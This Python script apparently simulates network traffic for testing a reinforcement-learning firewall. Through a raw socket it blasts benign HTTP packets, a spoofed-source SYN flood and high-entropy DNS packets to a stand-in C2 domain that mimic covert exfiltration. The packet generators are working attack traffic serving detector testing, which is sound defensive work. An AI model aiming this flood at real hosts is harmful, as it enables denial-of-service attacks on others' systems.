import time
import random
import socket
from scapy.all import Ether, IP, TCP, UDP, DNS, DNSQR, Raw

# Target interface and network configuration
# In a Dockerized/Simulated environment, this is usually the bridge interface
IFACE = "eth0"
TARGET_IP = "192.168.1.10" # The "Web Server" being protected
TARGET_MAC = "00:11:22:33:44:55" # Example destination MAC
SOURCE_MAC = "AA:BB:CC:DD:EE:FF" # Example source MAC

# Known malicious IPs to simulate attackers (Matches the Oracle in main.py)
MALICIOUS_IPS = ["192.168.1.100", "10.0.0.50", "172.16.0.23"]

def create_raw_socket(iface):
    """
    Creates an AF_PACKET raw socket. Bypassing Scapy's default send() function 
    and writing directly to the kernel socket achieves maximum PPS throughput.
    """
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((iface, 0))
    return s

def build_benign_traffic():
    """Pre-compiles normal HTTP web browsing traffic."""
    print("Compiling benign payload sequences...")
    packets = []
    for _ in range(100):
        src_ip = f"10.0.0.{random.randint(100, 200)}" # Random internal users
        pkt = Ether(src=SOURCE_MAC, dst=TARGET_MAC) / \
              IP(src=src_ip, dst=TARGET_IP) / \
              TCP(sport=random.randint(1024, 65535), dport=80, flags="PA") / \
              Raw(b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n")
        packets.append(bytes(pkt)) # Compile to raw bytes!
    return packets

def build_syn_flood():
    """Pre-compiles volumetric SYN flood attack from malicious IPs."""
    print("Compiling malicious SYN flood sequences...")
    packets = []
    for _ in range(500): # High volume to trigger Flow Volumetrics anomaly
        src_ip = random.choice(MALICIOUS_IPS)
        pkt = Ether(src=SOURCE_MAC, dst=TARGET_MAC) / \
              IP(src=src_ip, dst=TARGET_IP) / \
              TCP(sport=random.randint(1024, 65535), dport=80, flags="S") # SYN flag only, no payload
        packets.append(bytes(pkt))
    return packets

def build_high_entropy_exfiltration():
    """Pre-compiles DNS traffic with an encrypted/high-entropy payload."""
    print("Compiling high-entropy data exfiltration sequences...")
    packets = []
    for _ in range(50):
        src_ip = MALICIOUS_IPS[0]
        # Generate entirely random bytes to achieve a Shannon entropy close to 8.0
        # This simulates an attacker tunneling encrypted commands to avoid DPI.
        encrypted_payload = bytes([random.randint(0, 255) for _ in range(120)])
        pkt = Ether(src=SOURCE_MAC, dst=TARGET_MAC) / \
              IP(src=src_ip, dst=TARGET_IP) / \
              UDP(sport=random.randint(1024, 65535), dport=53) / \
              DNS(rd=1, qd=DNSQR(qname="malicious-c2.com")) / \
              Raw(encrypted_payload)
        packets.append(bytes(pkt))
    return packets

def blast_traffic(sock, packets, duration, description):
    """
    Floods the network interface with pre-compiled byte arrays.
    """
    print(f"\n[*] Starting Phase: {description}...")
    end_time = time.time() + duration
    count = 0
    
    # Tight loop for maximum throughput
    while time.time() < end_time:
        for pkt in packets:
            sock.send(pkt)
            count += 1
            
    # Calculate performance metrics
    pps = count / duration
    print(f"[+] Complete. Sent {count:,} packets in {duration}s (~{pps:,.0f} PPS).")

if __name__ == "__main__":
    print("=== Reinforcement Learning Firewall: Synthetic Traffic Simulator ===")
    try:
        raw_socket = create_raw_socket(IFACE)
        
        # 1. Pre-compile payloads into memory to eliminate CPU bottlenecks during transmission
        benign_pkts = build_benign_traffic()
        syn_flood_pkts = build_syn_flood()
        entropy_pkts = build_high_entropy_exfiltration()
        
        # 2. Execute the Simulation Timeline
        print("\nCommencing network simulation...")
        
        # Simulate normal morning traffic (5 seconds)
        blast_traffic(raw_socket, benign_pkts, duration=5, description="Benign Web Browsing")
        
        time.sleep(2)
        
        # Sudden Volumetric Attack
        blast_traffic(raw_socket, syn_flood_pkts, duration=3, description="Volumetric SYN Flood Attack")
        
        time.sleep(2)
        
        # Return to normal traffic, but with a covert background exfiltration tunnel
        blast_traffic(raw_socket, benign_pkts, duration=5, description="Benign Web Browsing")
        blast_traffic(raw_socket, entropy_pkts, duration=4, description="High-Entropy Encrypted C2 Exfiltration")
        
        print("\n=== Simulation Complete ===")
        
    except PermissionError:
        print("[!] ERROR: AF_PACKET raw sockets require elevated privileges. Please run with 'sudo'.")
    except OSError as e:
        print(f"[!] OS Error: {e}. Check if the interface '{IFACE}' is correct and active.")